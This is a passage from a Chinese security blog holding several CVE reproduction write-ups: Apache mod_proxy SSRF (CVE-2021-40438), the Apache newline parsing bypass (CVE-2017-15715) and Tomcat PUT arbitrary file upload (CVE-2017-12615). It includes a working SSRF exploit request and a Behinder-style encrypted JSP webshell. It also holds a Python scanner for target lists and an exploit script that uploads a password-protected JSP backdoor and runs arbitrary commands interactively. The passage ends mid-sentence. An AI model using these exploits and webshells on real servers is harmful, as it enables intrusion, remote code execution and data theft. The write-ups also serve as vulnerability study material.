handler，比如： ![image-20230916154849448](Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916154849448.png) 可以看到，每一个mod_proxy_xxx都会注册一个自己的canon handler，canon handler会在反代的时候被调用，用于告诉Apache主程序它应该把这个请求交给哪个处理方法来处理。 比如，我们看到mod_proxy_http的proxy_http_canon函数： static int proxy_http_canon(request_rec *r, char *url) { // ... // first part if (strncasecmp(url, \"http:\", 5) == 0) { url += 5; scheme = \"http\"; } else if (strncasecmp(url, \"https:\", 6) == 0) { url += 6; scheme = \"https\"; } else { return DECLINED; } port = def_port = ap_proxy_port_of_scheme(scheme); // second part ap_proxy_canon_netloc(r-&gt;pool, &amp;url, NULL, NULL, &amp;host, &amp;port); switch (r-&gt;proxyreq) { default: /* wtf are we doing here? */ case PROXYREQ_REVERSE: if (apr_table_get(r-&gt;notes, \"proxy-nocanon\")) { path = url; /* this is the raw path */ } else { path = ap_proxy_canonenc(r-&gt;pool, url, strlen(url), enc_path, 0, r-&gt;proxyreq); search = r-&gt;args; } break; case PROXYREQ_PROXY: path = url; break; } if (path == NULL) return HTTP_BAD_REQUEST; if (port != def_port) apr_snprintf(sport, sizeof(sport), \":%d\", port); else sport[0] = '\\0'; if (ap_strchr_c(host, ':')) { /* if literal IPv6 address */ host = apr_pstrcat(r-&gt;pool, \"[\", host, \"]\", NULL); } // fourth part r-&gt;filename = apr_pstrcat(r-&gt;pool, \"proxy:\", scheme, \"://\", host, sport, \"/\", path, (search) ? \"?\" : \"\", (search) ? search : \"\", NULL); return OK; } 这个函数中有三个主要的部分，第一部分检查了配置中的url的开头是不是http:或https:，如果不是，说明这个请求不该由mod_proxy_http模块处理，后续的过程跳过；第二部分，用各种方式获取到scheme、host、port、path、search等几个URL的组成变量；第三部分，拼接proxy:、scheme、://、host、sport、/、path、search，成为一个字符串，赋值给r-&gt;filename。 这里面，scheme、host、port来自于配置文件中配置的ProxyPass，而path、search来自于用户发送的数据包。也就是说，r-&gt;filename中的后半部分是用户可控的。 那我们回看前面的fix_uds_filename函数，它在r-&gt;filename中查找关键字unix:，并将这个关键字后面直到|的部分作为unix套接字地址，而将|后面的部分作为反代的后端地址。 我们可以通过请求的path或者search来控制这两个部分，控制了反代的后端地址，这也就是为什么这里会出现SSRF的原因。 0x04 限制绕过 当然，这里面有一个问题，那就是Apache在正常情况下，因为识别到了unix套接字，所以会把用户请求发送给这个本地文件套接字，而不是后端URL。 可以来做个测试，我们发送这样一个请求： GET /?unix:/var/run/test.sock|http://example.com/ HTTP/1.1 ... 此时会得到一个503错误，错误日志会反馈这样的结果： [Mon Oct 18 00:14:38.634795 2021] [proxy:error] [pid 782180:tid 140737306797824] (2)No such file or directory: AH02454: HTTP: attempt to connect to Unix domain socket /var/run/test.sock (192.168.1.1) failed [Mon Oct 18 00:14:38.634875 2021] [proxy_http:error] [pid 782180:tid 140737306797824] [client 192.168.1.142:59696] AH01114: HTTP: failed to make connection to backend: httpd-UDS 找不到unix套接字/var/run/test.sock，这是当然。 我们不能让他把请求发送到unix套接字上，而是发送给我们需要的|后面的地址。 国外那位作者给出了一个非常巧妙的方法，在fix_uds_filename函数中，unix套接字的地址来自于下面这两行代码： char *sockpath = ap_runtime_dir_relative(r-&gt;pool, urisock.path); apr_table_setn(r-&gt;notes, \"uds_path\", sockpath); 如果这里ap_runtime_dir_relative函数返回值是null，则后面获取uds_path时将不会使用unix套接字地址，而变成普通的TCP连接： uds_path = (*worker-&gt;s-&gt;uds_path ? worker-&gt;s-&gt;uds_path : apr_table_get(r-&gt;notes, \"uds_path\")); if (uds_path) { if (conn-&gt;uds_path == NULL) { /* use (*conn)-&gt;pool instead of worker-&gt;cp-&gt;pool to match lifetime */ conn-&gt;uds_path = apr_pstrdup(conn-&gt;pool, uds_path); } // ... conn-&gt;hostname = \"httpd-UDS\"; conn-&gt;port = 0; } else { // ... conn-&gt;hostname = apr_pstrdup(conn-&gt;pool, uri-&gt;hostname); conn-&gt;port = uri-&gt;port; // ... } 那么如何让ap_runtime_dir_relative的返回值是null？ap_runtime_dir_relative函数最后引用了apr库中的apr_filepath_merge函数，它的主要作用就是路径的join，用于处理相对路径、绝对路径、../连接。 这个函数中，当待join的两段路径长度+4大于APR_PATH_MAX，也就是4096的时候，则函数会返回一个路径过长的状态码，导致最后unix套接字的值是null： rootlen = strlen(rootpath); maxlen = rootlen + strlen(addpath) + 4; /* 4 for slashes at start, after * root, and at end, plus trailing * null */ if (maxlen &gt; APR_PATH_MAX) { return APR_ENAMETOOLONG; } 也就是说，我们只需要在unix:与|之间传入内容长度大概超过4092的字符串，就能构造出uds_path为null的结果，让Apache不再发送请求给unix套接字。 最后，这样构造出的请求成功触发SSRF漏洞： EXP GET /?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://example.com/ HTTP/1.1 Host: 192.168.1.162:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Connection: close ![image-20230916160123781](Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916160123781.png) ![image-20230916161434812](Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916161434812.png) 上面这个是vps新建的1.txt Apache官方对这个漏洞的修复也比较简单，因为用户只能控制r-&gt;filename的后半部分，而前半部分proxy:{scheme}://{host}{sport}/来自于配置文件，所以最新版改成检查其开头是不是proxy:unix:，这一部分用户无法控制。 0x05 mod_proxy_fcgi是否存在漏洞？ 我们前文都以mod_proxy_http作为例子来研究，而在Apache+PHP环境下，mod_proxy_fcgi的使用频率更高，那么它是否也会被SSRF漏洞影响呢？ 这个漏洞出现在modules/proxy/proxy_util.c的fix_uds_filename函数，理论上是mod_proxy的漏洞，那么它的子模块应该都会被影响，但这个漏洞中有一个很关键的变量是r-&gt;filename，他是否可控决定了后面的利用是否可以成功。 我们看一下mod_proxy_fcgi的canon函数： static int proxy_fcgi_canon(request_rec *r, char *url) { char *host, sport[7]; const char *err; char *path; apr_port_t port, def_port; fcgi_req_config_t *rconf = NULL; const char *pathinfo_type = NULL; if (ap_cstr_casecmpn(url, \"fcgi:\", 5) == 0) { url += 5; } else { return DECLINED; } // ... if (apr_table_get(r-&gt;notes, \"proxy-nocanon\")) { path = url; /* this is the raw path */ } else { path = ap_proxy_canonenc(r-&gt;pool, url, strlen(url), enc_path, 0, r-&gt;proxyreq); } if (path == NULL) return HTTP_BAD_REQUEST; r-&gt;filename = apr_pstrcat(r-&gt;pool, \"proxy:fcgi://\", host, sport, \"/\", path, NULL); // ... } 可见，这里的r-&gt;filename等于proxy:fcgi://{host}{sport}/{path}，相比于mod_proxy_http少了search。不过，path仍然是用户可以控制的，我们可以尝试发送这样的数据包： GET /unix:testtest|http://example.com/1.php HTTP/1.1 ... 经过调试可见，path中的|被ap_proxy_canonenc函数编码成了%7C： ![image-20230916160430616](Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916160430616.png) 没有|，后面也就无法完成SSRF利用了。 0x06 哪些模块受到影响 那么，我们其实可以认为，如果r-&gt;filename有部分可控，且可控的部分没有被编码（不是path），这个模块就会受到SSRF漏洞的影响。 对这个结论我没有逐一测试考证，我仅挑选另一个较为常用的模块mod_proxy_ajp来复现漏洞。 mod_proxy_ajp是用于反代Tomcat的一个Apache模块，Tomcat在8.5.51版本以前默认会开启两个端口8080和8009，分别对应HTTP协议和AJP协议。HTTP协议好理解，AJP协议是一个二进制协议，通信协议相比起来效率更高。所以以前很多运维人员会将Tomcat架设在Apache之后，然后二者之间使用AJP协议通信。 Tomcat 8.5.51之后的版本受到Ghostcat漏洞影响不再默认开放8009端口。 Apache下有两个模块能实现AJP的反代通信： mod_proxy_ajp 这就是mod_proxy的一个子模块，由Apache HTTPd官方维护 mod_jk 这是Tomcat官方维护的一个Apache模块，更加出名用户也更多 由于mod_jk不是用mod_proxy的代码，所以不受到影响，我们今天仅测试mod_proxy_ajp。 简单部署一个开放8009端口的Tomcat服务器，并配置好mod_proxy_ajp进行调试，可见其proxy_ajp_canon函数r-&gt;filename中是包含search的： static int proxy_ajp_canon(request_rec *r, char *url) { char *host, *path, sport[7]; char *search = NULL; const char *err; apr_port_t port, def_port; /* ap_port_of_scheme() */ if (strncasecmp(url, \"ajp:\", 4) == 0) { url += 4; } else { return DECLINED; } // ... r-&gt;filename = apr_pstrcat(r-&gt;pool, \"proxy:ajp://\", host, sport, \"/\", path, (search) ? \"?\" : \"\", (search) ? search : \"\", NULL); return OK; } 那么按照我们的预测，这里也会存在SSRF漏洞。果然测试成功： ![image-20230916160702168](Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916160702168.png) 那么，mod_proxy_http2、mod_proxy_balancer、mod_proxy_wstunnel等这些模块也会受到影响，而mod_proxy_uwsgi、mod_proxy_scgi等模块不受影响。我没有严格验证，有兴趣的同学可以自己下去调试一下，也许还能找到绕过方法。 0x07 几个常见问题和总结 ​ 一个大家问的比较多的问题：这个SSRF漏洞是否能够POST？答案是肯定的，理解了原理的同学肯定能明白，我们实际上是控制了反向代理的目标服务器地址。既然是反向代理，那么实际上用户请求的大部分原始数据都会被直接转发给后端，所以，我们只需要发送POST请求，即可让执行POST的SSRF，比如： ![image-20230916160751658](Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916160751658.png) 另一个，这个SSRF漏洞是否可以打本地的unix socket？答案是肯定的。原本这个漏洞的第一请求目标就是本地的unix套接字，我们使用4092个超长search绕过了这个限制让他可以打任意远程地址，只要让它回归原本的方法就可以打本地的unix套接字了： ![image-20230916160834660](Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916160834660.png) 打本地unix套接字的好处是可以攻击类似于Docker、Supervisor这样的本地服务。 最后一个问题，这个SSRF漏洞是否可以攻击一些非HTTP协议的服务？答案也是肯定的。TCP是一个数据流，即使我们打出的数据包前面有HTTP头，这并不影响后续正常的满足二进制协议的数据流的发送与接收。不过有一个例外情况，如果目标服务有一些特殊的操作，类似于高版本redis读取到一些特殊的HTTP数据段就断开TCP连接这样的操作，那么可能需要进行一些额外绕过了。 总结一下，这个SSRF漏洞的本质是Apache在解析反代服务URL的时候，由于对unix:位置要求不严格，导致用户的输入可以控制反代的逻辑，最终导致反代URL被控制，造成SSRF漏洞。 CVE-2021-40438 漏洞为 Apache httpd 的 SSRF 漏洞，核心原理是 mod_proxy 模块为了支持 UDS (Unix Domain Socket) 转发而产生了安全性问题，并由多个位置代码问题组合产生。通过上面的分析可知，漏洞触发的前提如下： 1.需开启 mod_proxy 配置 2.需已知 `VirtualHost` 中 `ProxyPass` 指定的 URL 项 3.使用 GET 请求超长字符串且超过目标 Apache 设置 4.windows 版本漏洞依然存在 这里不知为何不能访问百度（新手别喷┭┮﹏┭┮）或许是百度做了防护或者是百度协议为https的缘故，亦或者某种原因吧，可能是我浅薄了。。。 0x08 参考文章 CVE-2021-40438 Apache mod_proxy SSRF 漏洞分析 Apache mod_proxy SSRF（CVE-2021-40438）的一点分析和延伸","tags":["CVE"],"categories":["CVE漏洞"]},{"title":"Apache HTTPD 换行解析漏洞（CVE-2017-15715）","path":"/2023/09/16/apache-httpd-huan-xing-jie-xi-lou-dong-cve-2017-15715/","content":"0x01 漏洞描述 Apache HTTPD是一款HTTP服务器，它可以通过mod_PHP来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，shell.PHP\\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。 0x02 影响版本 Apache HTTPD 2.4.0~2.4.29 0x03 漏洞分析 此漏洞的出现是由于 apache 在修复第一个后缀名解析漏洞时，用正则来匹配后缀。在解析 php 时 xxx.php\\x0A 将被按照 php 后缀进行解析，导致绕过一些服务器的安全策略。 index.php源码： &lt;?php if(isset($_FILES['file'])) { $name = basename($_POST['name']); //相当于/var/www/html/1.php在basename函数下只返回1.php $ext = pathinfo($name,PATHINFO_EXTENSION); //取上传文件的后缀名，例如上面的php if(in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'])) { exit('bad file');//设置黑名单 } move_uploaded_file($_FILES['file']['tmp_name'], './' . $name);//将文件保存到某个路径下，并重新命名 } else { ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Upload&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form method=\"POST\" enctype=\"multipart/form-data\"&gt; &lt;p&gt; &lt;label&gt;file:&lt;input type=\"file\" name=\"file\"&gt;&lt;/label&gt; &lt;/p&gt; &lt;p&gt; &lt;label&gt;filename:&lt;input type=\"text\" name=\"name\" value=\"evil.php\"&gt;&lt;/label&gt; &lt;/p&gt; &lt;input type=\"submit\"&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php } ?&gt; 以POST请求方式传入参数name，并通过设置黑名单来过滤后缀。 配置文件： #cat /etc/apache2/conf-available/docker-php.conf &lt;FilesMatch \\.php$&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; DirectoryIndex disabled DirectoryIndex index.php index.html &lt;Directory /var/www/&gt; Options -Indexes AllowOverride All &lt;/Directory&gt; ​ 前三行的内容意思是将所有以“.php”为后缀的文件内容当作PHP代码进行解析，但是却使用了“$”进行文件匹配，这就导致了漏洞的产生。（很明显如果没有后面的$，那我们根本 不可能上传.php文件让其以php代码解析） ​ 但是不巧的是这里还有一个东西就是$这个东西，它是用来匹配字符串结尾位置的，而且如果设置了RegExp 对象(正则表达式)的 Multiline(/m) 属性，则 $ 也匹配 ‘ ’ 或 ‘\\r’。 ​ 所以如果我们设置了RegExp 对象的 Multiline 属性(\\m)的条件下，$还会匹配到字符串结尾的换行符（也就是%0a),于是也就产生了这么一个换行解析漏洞 0x04 漏洞复现 访问http://ip:8080，显示如下页面： ![image-20230916145037717](Apache HTTPD 换行解析漏洞（CVE-2017-15715）/image-20230916145037717.png) 简单的上传界面，我们先随便上传测试一下 ![image-20230916145100933](Apache HTTPD 换行解析漏洞（CVE-2017-15715）/image-20230916145100933.png) 可以看到evil.php被拦截了，我们bp抓包在后面添加换行符看看 ​ 这里有一点需要注意，我们不能直接在shell.php文件名后面加上%0a，因为Get传参他是有URL的编码解码的，但是我们这里是POST传参，他没有，所以我们通过Hex编码的方式手动给他加上 我们先加一个a(我们都知道a的16进制编码是61)，然后我们去找到这个61进行替换就好了 ![image-20230916145831851](Apache HTTPD 换行解析漏洞（CVE-2017-15715）/image-20230916145831851.png) 改为0a ![image-20230916145931567](Apache HTTPD 换行解析漏洞（CVE-2017-15715）/image-20230916145931567.png) ![image-20230916145941649](Apache HTTPD 换行解析漏洞（CVE-2017-15715）/image-20230916145941649.png) 看看是否上传成功，这里不知道为何我访问没反应，于是重新上传了一下，进入Hex在evil.php后直接加了0a，上传后，访问evil.php成功了 ![image-20230916150348626](Apache HTTPD 换行解析漏洞（CVE-2017-15715）/image-20230916150348626.png) 改为一句话木马，蚁剑连接也成功 ![image-20230916150502997](Apache HTTPD 换行解析漏洞（CVE-2017-15715）/image-20230916150502997.png) 0x05 漏洞修复 1.升级到最新版本 2.将上传的文件重命名为时间戳+随机数+.jpg的格式并禁用上传文件目录执行脚本权限 3.禁止上传文件执行 0x06 总结 这个漏洞需要有以下利用条件： 1、获取文件名时不能用**$_FILES['file']['name'],因为它会自动把换行去掉。 2、Apache版本为2.4.0到2.4.29 3、服务器必须是**linux系统**，因为windows环境下不支持后缀名带有换行符\\x0a 总体上而言，只要取**$FILES[‘file’][‘name’]作为文件名，就可以无视该解析漏洞，所以该漏洞总体来说实际用处不大，但是由于漏洞根本成因在于$，在以后的其他某些漏洞可能会有利用到的地方，所以这个作为一种姿势学习一下还是很有趣的。 0x07 参考文章 Apache HTTPD 换行解析漏洞分析与复现（CVE-2017-15715） 【漏洞复现】Apache HTTPD 换行解析漏洞 (CVE-2017-15715) Apache HTTPD换行解析漏洞（CVE-2017-15715","tags":["CVE"],"categories":["CVE漏洞"]},{"title":"Tomcat-任意文件写入CVE-2017-12615","path":"/2023/09/16/tomcat-ren-yi-wen-jian-xie-ru/","content":"0x01 漏洞描述： CVE-2017-12615：远程代码执行漏洞 影响范围：Apache Tomcat 7.0.0 - 7.0.79 (windows环境) 当 Tomcat 运行在 Windows 操作系统时，且启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。 0x02 复现过程： 开启环境后进入配置文件查看一下 #查看镜像 docker ps #进入镜像环境 docker exec -ti 03de30c386ea bas #查看配置文件conf/web.xml中readonly的设置 cat conf/web.xml | grep readonly 查看网站 http://your-ip:8080/ 方法一： 使用burpsuite抓包，修改GET为PUT上传方式，添加文件名1.jsp/，添加shell脚本 &lt;%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt; 成功上传 使用冰蝎访问 这里不知为何，我的冰蝎死活连接不上 方法二(适用于Windows系统) 添加文件名2.jsp%20，添加shell脚本 方法三(适用于Windows系统) 添加文件名3.jsp::$DATA，添加shell脚本 0x03 POC和EXP脚本 POC代码 #CVE-2017-12615 POC __author__ = '纸机' import requests import optparse import os parse = optparse.OptionParser(usage = 'python3 %prog [-h] [-u URL] [-p PORT] [-f FILE]') parse.add_option('-u','--url',dest='URL',help='target url') parse.add_option('-p','--port',dest='PORT',help='target port[default:8080]',default='8080') parse.add_option('-f',dest='FILE',help='target list') options,args = parse.parse_args() #print(options) #验证参数是否完整 if (not options.URL or not options.PORT) and not options.FILE: print('Usage:python3 CVE-2017-12615-POC.py [-u url] [-p port] [-f FILE] ') exit('CVE-2017-12615-POC.py:error:missing a mandatory option(-u,-p).Use -h for basic and -hh for advanced help') filename = '/hello.jsp' #测试数据 data = 'hello' #提交PUT请求 #resp = requests.post(url1,headers=headers,data=data) #验证文件是否上传成功 #response = requests.get(url2) #上传文件 def upload(url): try: response = requests.put(url+filename+'/',data=data) return 1 except Exception as e: print(\"[-] {0} 连接失败\".format(url)) return 0 def checking(url): try: #验证文件是否上传成功 response = requests.get(url+filename) #print(url+filename) if response.status_code == 200 and 'hello' in response.text: print('[+] {0} 存在CVE-2017-12615 Tomcat 任意文件读写漏洞'.format(url)) else: print('[-] {0} 不存在CVE-2017-12615 Tomcat 任意文件读写漏洞'.format(url)) except Exception as e: #print(e) print(\"[-] {0} 连接失败\".format(url)) if options.FILE and os.path.exists(options.FILE): with open(options.FILE) as f: urls = f.readlines() #print(urls) for url in urls: url = str(url).replace(' ', '').replace('\\r', '').strip() if upload(url) == 1: checking(url) elif options.FILE and not os.path.exists(options.FILE): print('[-] {0} 文件不存在'.format(options.FILE)) else: #上传链接 url = options.URL+':'+options.PORT if upload(url) == 1: checking(url) 测试 python3 CVE-2017-15715-POC.py -u http://192.168.132.144 -p8080 python3 CVE_2017_12615.py -f IP.txt EXP代码 #CVE-2017-12615 EXP __author__ = '纸机' import requests import optparse import time parse = optparse.OptionParser(usage = 'python3 %prog [-h] [-u URL] [-p PORT]') parse.add_option('-u','--url',dest='URL',help='target url') parse.add_option('-p','--port',dest='PORT',help='target port[default:8080]',default='8080') options,args = parse.parse_args() #验证参数是否完整 if not options.URL or not options.PORT: print('Usage:python3 CVE-2017-12615-POC.py [-u url] [-p port] ') exit('CVE-2017-12615-POC.py:error:missing a mandatory option(-u,-p).Use -h for basic and -hh for advanced help') url = options.URL+':'+options.PORT filename = '/backdoor.jsp' payload = filename+'?pwd=023&amp;i=' headers = {\"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0\"} #木马 data = '''&lt;% if(\"023\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\"&lt;pre&gt;\"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\"&lt;/pre&gt;\"); } %&gt;''' #上传木马文件 def upload(url): print('[*] 目标地址:'+url) try: respond = requests.put(url+filename+'/',headers=headers,data = data) #print(respond.status_code) if respond.status_code == 201 or respond.status_code == 204: #print('[*] 目标地址:'+url) print('[+] 木马上传成功') except Exception as e: print('[-] 上传失败') return 0 #命令执行 def attack(url,cmd): try: respond = requests.get(url+payload+cmd) if respond.status_code == 200: print(str(respond.text).replace(\"&lt;pre&gt;\",\"\").replace(\"&lt;/pre&gt;\",\"\").strip()) except Exception as e: print('[-] 命令执行错误') if upload(url) == 0: exit() time.sleep(0.5) print('输入执行命令(quit退出):') while(1): cmd = input('&gt;&gt;&gt;') if(cmd == 'quit'): break attack(url,cmd) 测试 python3 CVE-2017-12615-EXP.py -u http://192.168.132.144 -p 35654 0x04 修复建议 设置conf/webxml 文件的 